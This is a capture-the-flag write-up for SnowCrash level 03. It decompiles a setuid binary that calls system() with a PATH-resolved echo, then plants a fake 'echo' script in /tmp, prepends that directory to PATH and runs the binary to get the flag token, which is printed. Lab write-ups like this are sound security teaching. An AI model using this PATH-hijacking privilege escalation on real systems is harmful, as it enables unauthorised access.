# Level 03

## Initial Reconnaissance
When browsing the files of the home of level03 user, we can see there is binary file called level03 owned by level03.

```bash
ls -al
```

```
total 24
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Executing the binary, it says :
```
Exploit me
```

We can download the binary on our local machine.

```bash
scp -P 4242 level03@[IP]:level03 .
```

We pass it through a binary analysis tool on : https://dogbolt.org/.

```c
int32_t main(int argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    return system("/usr/bin/env echo Exploit me");
}
```

## Vulnerability Found

We can see that the binary uses setresuid and setresgid to set the effective user and group ID to the real user and group ID. Since it is owned by flag03, it is executed with the user flag03.

We can see that the binary uses system to execute the command '/usr/bin/env echo Exploit me' but echo is a relative path and not an absolute one.

## Exploitation Steps

We can modify the called echo command to execute our own command. Here we can flag03 to execute getflag. Let's create a file called echo.

```bash
mkdir /tmp/exploit
cd /tmp/exploit

cat > echo << 'EOF'
#!/bin/bash
/bin/getflag
EOF

chmod +x echo
```

We can now add it to the PATH and execute the binary.

```bash
export PATH=/tmp/exploit:$PATH
./level03
```

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Additional Notes

